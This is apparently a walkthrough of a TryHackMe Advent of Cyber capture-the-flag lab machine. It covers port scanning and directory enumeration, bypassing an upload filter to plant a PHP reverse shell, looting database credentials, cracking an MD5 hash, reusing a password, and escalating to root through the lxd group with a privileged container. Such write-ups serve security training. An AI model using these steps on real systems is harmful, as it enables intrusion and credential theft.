# TRYHACKME: ADVENTOFCYBER2 [DAY 24] SPECIAL - The Trial Before Christmas

```
It was the night before Christmas and The Best Festival Company could finally rest. All of the toys had been made and the company had recovered from attack after attack. Everything was in Santa's hands now, leaving the elves to do little more than wish him a safe journey ahead. Elf McEager sat at his terminal staring absentmindedly at light snow that had begun to fall. Just as he had drifted off to sleep Elf McEager was jolted to attention as a small parcel appeared just at the edge of his view. 

The present was wrapped in a deep blue velvet that appeared to shimmer in and out of the firelight, not unlike a blinking terminal prompt. Carefully, Elf McEager reached for the azure ribbon, untying it slowly so as to not damage it. The velvet slowly fell away, revealing a small NUC computer with a letter on top. Unfolding the letter, Elf McEager read it aloud:



"Elf McEager - your boundless effort to save Christmas this year has not gone unnoticed. I wanted to reward you with a special present, however, there's a catch. Elf McSkidy and I have seen your skills advance and we feel it would only be appropriate to give you a present after one last challenge. Inside this package, you'll have also found a computer. Plug this into the network and hack into it. Best of luck and Merry Christmas - Santa"



Without delay, Elf McEager connected the NUC appropriately and watched it whir to life. A small screen nearby the power button blinked and then displayed the IP address assigned to the device. Next to the IP, a small symbol appeared. McEager quietly wondered to himself what it could mean as he logged into his terminal, ready to start his final challenge. 
```

TOPICS: 

### QUESTIONS

Scan the machine What ports are open?

```
$ nmap -p 1-10000 -T4 10.10.207.247o
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-05 12:23 EST
Nmap scan report for 10.10.207.247
Host is up (0.10s latency).
Not shown: 9999 closed ports
PORT   STATE SERVICE
80/tcp open  http
65000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 118.99 seconds
```

What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step. 

```
$ curl -s 10.10.207.247:65000 | grep title
                <title>Light Cycle</title>
```

What is the name of the hidden php page?

```
$ gobuster dir -u http://10.10.207.247:65000/ -w /usr/share/wordlists/dirb/common.txt -x php

/uploads.php (Status: 200)
```

What is the name of the hidden directory where file uploads are saved?

```
$ gobuster dir -u http://10.10.207.247:65000/ -w /usr/share/wordlists/dirb/common.txt -x php

/grid (Status: 301)
```

Bypass the filters. Upload and execute a reverse shell. 

```
Using BURP, drop request to http://10.10.97.122:65000/assets/js/filter.js

Upload /usr/share/webshells/php/php-reverse-shell.php as shell.jpg.php

Setup NetCat to listen for connection.
```

What is the value of the web.txt flag?

```
$ cat /var/www/web.txt
THM{ENTER_THE_GRID}
```

Upgrade and stabilize your shell.

```
# Spawn a better-featured bash shell (prettier)
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Give access to term commands such as clear
export TERM=xterm

# Turns off our own terminal echo (to get tab autocompletes, arrow keys, ctrl-c to kill processes)
Ctrl + Z / stty raw -echo; fg
```

Review the configuration files for the webserver to find some useful loot in the form of credentials.  What credentials do you find?

```
ww-data@light-cycle:/var/www/TheGrid/includes$ cat dbauth.php 
<?php
        $dbaddr = "localhost";
        $dbuser = "tron";
        $dbpass = "IFightForTheUsers";
        $database = "tron";

        $dbh = new mysqli($dbaddr, $dbuser, $dbpass, $database);
        if($dbh->connect_error){
                die($dbh->connect_error);
        }
?>
```

Access the database and discover the encrypted credentials. What is the name of the database you find these in?

```
www-data@light-cycle:/var/www/TheGrid/includes$ mysql -utron -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 3
Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| tron               |
+--------------------+
2 rows in set (0.00 sec)
```

In the modern age of password cracking, weak passwords can often be cracked without any cracking at all! Many websites now exist with the sole goal of hosting rainbow tables - tables of previously cracked passwords. This allows us more than often to simply input a password hash and nearly instantly receive the cracked password. Some various sites that I find myself (Dark) commonly using, especially throughout the case of CTFs, include the following:

- https://crackstation.net/ 

- https://md5decrypt.net/en/ 

- https://hashes.com/en/decrypt/hash 

Crack the password. What is it?

```
mysql> use tron;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------+
| Tables_in_tron |
+----------------+
| users          |
+----------------+
1 row in set (0.00 sec)

mysql> SELECT * FROM users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | flynn    | edc621628f6d19a13a00fd683f5e3ff7 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```

```
MD5 Hash -> @computer@
```

Use su to login to the newly discovered user by exploiting password reuse. 

```
www-data@light-cycle:/var/www/TheGrid/includes$ su flynn
Password: 
flynn@light-cycle:/var/www/TheGrid/includes$ cd 
flynn@light-cycle:~$ ls
user.txt
flynn@light-cycle:~$ cat user.txt 
THM{IDENTITY_DISC_RECOGNISED}
```

Check the user's groups. Which group can be leveraged to escalate privileges? 

```
flynn@light-cycle:~$ id
uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)
```

Abuse this group to escalate privileges to root.

```
flynn@light-cycle:~$ lxc image list
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| Alpine | a569b9af4e85 | no     | alpine v3.12 (20201220_03:48) | x86_64 | 3.07MB | Dec 20, 2020 at 3:51am (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
flynn@light-cycle:~$ lxc init Alpine strongbad -c security.privileged=true
Creating strongbad

flynn@light-cycle:~$ lxc config device add strongbad trogdor disk source=/ path=/mnt/root recursive=true
Device trogdor added to strongbad

flynn@light-cycle:~$ lxc start strongbad

flynn@light-cycle:~$ lxc exec strongbad /bin/sh

~ # id
uid=0(root) gid=0(root)

What is the value of the root.txt flag?

```
~ # cd /mnt/root/root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt
THM{FLYNN_LIVES}



"As Elf McEager claimed the root flag a click could be heard as a small chamber on the anterior of the NUC popped open. Inside, McEager saw a small object, roughly the size of an SD card. As a moment, he realized that was exactly what it was. Perplexed, McEager shuffled around his desk to pick up the card and slot it into his computer. Immediately this prompted a window to open with the word 'HOLO' embossed in the center of what appeared to be a network of computers. Beneath this McEager read the following: Thank you for playing! Merry Christmas and happy holidays to all!"
```
